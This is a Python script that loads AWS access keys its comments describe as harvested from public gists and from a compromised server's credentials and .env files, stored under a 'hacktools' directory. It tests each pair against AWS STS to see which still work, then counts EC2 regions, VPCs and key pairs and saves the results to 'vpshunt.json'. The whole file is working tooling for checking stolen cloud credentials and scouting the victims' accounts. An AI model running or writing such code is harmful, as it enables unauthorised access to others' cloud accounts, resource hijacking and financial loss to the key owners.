#!/usr/bin/env python3
"""Validate harvested AWS keys via STS + list regions/EC2/limits. No secrets printed."""
import json, os, sys, re
import boto3
from botocore.exceptions import ClientError, NoCredentialsError

PAIRS = []

def add(ak, sk, src, tok=None):
    if ak and sk and len(ak) >= 16 and len(sk) >= 30:
        PAIRS.append((ak, sk, tok, src))

# harvested gists
for p in ['$HOME/hacktools/awscamp/q1/cloud_keys.jsonl',
          '$HOME/hacktools/awscamp/q2/cloud_keys.jsonl']:
    if not os.path.exists(p):
        continue
    cur = {}
    for line in open(p):
        line = line.strip()
        if not line:
            continue
        d = json.loads(line)
        k, v = d.get('kind'), str(d.get('value', ''))
        if k == 'aws_key_id':
            cur.setdefault('ids', []).append(v)
        elif k == 'aws_secret':
            cur.setdefault('secs', []).append(v)
        elif k == 'aws_pair':
            add(v, d.get('secret') or d.get('value2') or '', d.get('source', p))
    ids = cur.get('ids', [])
    secs = cur.get('secs', [])
    for i, ak in enumerate(ids):
        add(ak, secs[i] if i < len(secs) else (secs[0] if secs else ''), p)

# ctl_vps credential file
def parse_ini(path, src):
    ak = sk = tok = None
    if not os.path.exists(path):
        return
    for line in open(path):
        line = line.strip()
        if line.startswith('aws_access_key_id'):
            ak = line.split('=', 1)[1].strip()
        elif line.startswith('aws_secret_access_key'):
            sk = line.split('=', 1)[1].strip()
        elif line.startswith('aws_session_token'):
            tok = line.split('=', 1)[1].strip()
    add(ak, sk, src, tok)

parse_ini('$HOME/hacktools/ctl_vps/www/.aws/credentials', 'ctl_vps/.aws/credentials')

# .env in ctl_vps
envf = '$HOME/hacktools/ctl_vps/www/.env'
if os.path.exists(envf):
    e = {}
    for line in open(envf):
        if '=' in line and not line.strip().startswith('#'):
            k, v = line.strip().split('=', 1)
            e[k] = v.strip().strip('"\'')
    add(e.get('AWS_ACCESS_KEY_ID'), e.get('AWS_SECRET_ACCESS_KEY'), envf + ':AWS')

out = []
for ak, sk, tok, src in PAIRS:
    rec = {'src': src, 'ak_tail': ak[-4:], 'valid': False}
    try:
        kw = dict(aws_access_key_id=ak, aws_secret_access_key=sk, region_name='us-east-1')
        if tok:
            kw['aws_session_token'] = tok
        sts = boto3.client('sts', **kw)
        ident = sts.get_caller_identity()
        rec['valid'] = True
        rec['account'] = ident['Account']
        rec['arn'] = ident['Arn']
        try:
            ec2 = boto3.client('ec2', **kw)
            regs = [r['RegionName'] for r in ec2.describe_regions()['Regions']]
            rec['regions'] = len(regs)
        except Exception as ex:
            rec['regions_err'] = str(ex)[:120]
        try:
            ec2 = boto3.client('ec2', **kw)
            rec['vpcs'] = len(ec2.describe_vpcs()['Vpcs'])
            rec['keypairs'] = len(ec2.describe_key_pairs()['KeyPairs'])
        except Exception as ex:
            rec['ec2_err'] = str(ex)[:160]
    except (ClientError, NoCredentialsError) as ex:
        rec['err'] = str(ex)[:160]
    except Exception as ex:
        rec['err'] = repr(ex)[:160]
    out.append(rec)

json.dump(out, open('$HOME/hacktools/vpshunt.json', 'w'), indent=1)
for r in out:
    print(json.dumps(r))
